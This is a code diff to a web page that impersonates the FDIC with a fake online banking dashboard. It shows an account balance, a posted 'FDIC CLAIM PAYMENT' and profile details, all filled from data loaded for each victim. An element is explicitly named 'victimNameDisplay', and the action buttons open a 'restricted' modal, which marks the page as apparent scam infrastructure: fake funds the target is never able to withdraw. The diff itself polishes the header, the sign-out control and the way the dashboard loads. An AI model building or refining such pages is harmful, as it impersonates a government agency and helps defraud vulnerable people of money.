@@ -24,24 +24,40 @@
     .header { 
       background: var(--fdic-blue); 
       color: white; 
-      padding: 20px; 
+      padding: 15px 20px; 
       display: flex; 
-      align-items: center; 
-      justify-content: space-between;
+      justify-content: space-between; 
+      align-items: center;
       box-shadow: 0 2px 5px rgba(0,0,0,0.2);
     }
-    .brand { display: flex; align-items: center; gap: 15px; }
-    .logo-text { font-size: 28px; font-weight: 800; letter-spacing: 1px; }
+    
+    /* Left Side: Sign Out */
+    .header-left {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: flex-start;
+    }
+    .logout-btn { 
+      color: white; 
+      cursor: pointer; 
+      font-size: 12px; 
+      font-weight: 600; 
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .logout-btn span { display: block; }
+
+    /* Right Side: Branding */
+    .brand { display: flex; align-items: baseline; gap: 10px; }
+    .logo-text { font-size: 26px; font-weight: 800; letter-spacing: 1px; }
     .slogan { 
-      font-size: 10px; 
+      font-size: 11px; 
       font-weight: 400; 
       opacity: 0.9; 
-      line-height: 1.2; 
-      max-width: 120px; 
-      text-transform: uppercase; 
+      line-height: 1.3; 
+      white-space: nowrap; /* Keeps it on one line if space permits, or wraps cleanly */
     }
-    .user-actions { font-size: 14px; }
-    .logout-btn { color: white; cursor: pointer; text-decoration: underline; }
 
     /* Main Container */
     .container { max-width: 600px; margin: 0 auto; padding: 20px; }
@@ -92,8 +108,15 @@
 
     /* Profile Section */
     .profile-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border); font-size: 14px; }
-    .profile-label { color: var(--text-light); }
-    .profile-value { font-weight: 600; color: var(--text-dark); }
+    .profile-item:last-child { border-bottom: none; }
+    .profile-label { color: var(--text-light); width: 100px; }
+    .profile-value { font-weight: 600; color: var(--text-dark); flex: 1; text-align: right; }
+    
+    /* Specific spacing for Address */
+    .profile-item.address-item {
+      padding-top: 20px;
+      padding-bottom: 20px;
+    }
 
     /* Bottom Navigation */
     .bottom-nav {
@@ -145,13 +168,15 @@
 
   <!-- Header -->
   <div class="header">
+    <div class="header-left">
+      <div class="logout-btn" id="logoutBtn">
+        <span>Sign</span>
+        <span>Out</span>
+      </div>
+    </div>
     <div class="brand">
       <div class="logo-text">FDIC</div>
-      <div class="slogan">Backed by the full faith and credit of the United States government.</div>
-    </div>
-    <div class="user-actions">
-      <span id="userNameHeader" style="margin-right: 15px; font-weight: 500;"></span>
-      <span class="logout-btn" id="logoutBtn">Sign Out</span>
+      <div class="slogan">backed by the full faith and credit of the United States government.</div>
     </div>
   </div>
 
@@ -159,14 +184,14 @@
     <div id="loadingMsg" class="loading">Loading account details...</div>
 
     <!-- Dashboard Tab Content -->
-    <div id="tab-dashboard" class="tab-content">
+    <div id="tab-dashboard" class="tab-content hidden">
       <div class="card">
         <div class="account-title">PRIMARY CHECKING</div>
-        <div class="account-holder" id="victimNameDisplay">Victim Name</div>
-        <span class="account-number" id="accountNumber">---1234</span>
+        <div class="account-holder" id="victimNameDisplay"></div>
+        <span class="account-number" id="accountNumber"></span>
         
         <div class="balance-label">Available Balance</div>
-        <div class="balance-amount" id="balanceDisplay">$0.00</div>
+        <div class="balance-amount" id="balanceDisplay"></div>
 
         <div class="actions-grid">
           <button class="action-btn" onclick="showRestrictedModal()">
@@ -186,11 +211,11 @@
         <div class="trans-item">
           <div class="trans-info">
             <div class="trans-desc">FDIC CLAIM PAYMENT REF:8821-4490</div>
-            <div class="trans-meta" id="transDate">07/23/2026 09:14:22 AM EST</div>
+            <div class="trans-meta" id="transDate"></div>
             <div class="trans-meta">ID: FDIC-CLM-20260723-99841</div>
           </div>
           <div style="text-align: right;">
-            <div class="trans-amount" id="transAmount">+$4,250.00</div>
+            <div class="trans-amount" id="transAmount"></div>
             <div class="trans-status">POSTED</div>
           </div>
         </div>
@@ -204,13 +229,13 @@
         <div class="trans-item">
           <div class="trans-info">
             <div class="trans-desc">FDIC CLAIM PAYMENT REF:8821-4490</div>
-            <div class="trans-meta" id="transDateFull">07/23/2026 09:14:22 AM EST</div>
+            <div class="trans-meta" id="transDateFull"></div>
             <div class="trans-meta">ID: FDIC-CLM-20260723-99841</div>
             <div class="trans-meta">Sender: FEDERAL DEPOSIT INSURANCE CORP</div>
             <div class="trans-meta">Reference: ACCT-SETTLEMENT</div>
           </div>
           <div style="text-align: right;">
-            <div class="trans-amount" id="transAmountFull">+$4,250.00</div>
+            <div class="trans-amount" id="transAmountFull"></div>
             <div class="trans-status">POSTED</div>
           </div>
         </div>
@@ -223,27 +248,27 @@
         <div class="section-header">Account Details</div>
         <div class="profile-item">
           <span class="profile-label">Account Holder</span>
-          <span class="profile-value" id="profileName">Name</span>
+          <span class="profile-value" id="profileName"></span>
         </div>
         <div class="profile-item">
           <span class="profile-label">Account Number</span>
-          <span class="profile-value" id="profileAcctNum">---1234</span>
+          <span class="profile-value" id="profileAcctNum"></span>
         </div>
         <div class="profile-item">
           <span class="profile-label">Account Type</span>
-          <span class="profile-value" id="profileType">CHECKING</span>
+          <span class="profile-value" id="profileType"></span>
         </div>
         <div class="profile-item">
           <span class="profile-label">Email</span>
-          <span class="profile-value" id="profileEmail">email@example.com</span>
+          <span class="profile-value" id="profileEmail"></span>
         </div>
         <div class="profile-item">
           <span class="profile-label">Phone</span>
-          <span class="profile-value" id="profilePhone">555-0199</span>
+          <span class="profile-value" id="profilePhone"></span>
         </div>
-        <div class="profile-item">
+        <div class="profile-item address-item">
           <span class="profile-label">Address</span>
-          <span class="profile-value" id="profileAddress">123 Main St</span>
+          <span class="profile-value" id="profileAddress"></span>
         </div>
       </div>
     </div>
@@ -299,12 +324,8 @@
 
     // Tab Switching Logic
     window.switchTab = (tabName) => {
-      // Hide all tabs
       document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
-      // Show selected tab
       document.getElementById(`tab-${tabName}`).classList.remove('hidden');
-      
-      // Update Nav Icons
       document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
       event.currentTarget.classList.add('active');
     };
@@ -333,7 +354,7 @@
           
           if (data) {
             document.getElementById('loadingMsg').style.display = 'none';
-            document.getElementById('userNameHeader').textContent = data.name;
+            document.getElementById('tab-dashboard').classList.remove('hidden'); // Show dashboard by default
             
             // Dashboard Data
             document.getElementById('victimNameDisplay').textContent = data.name;
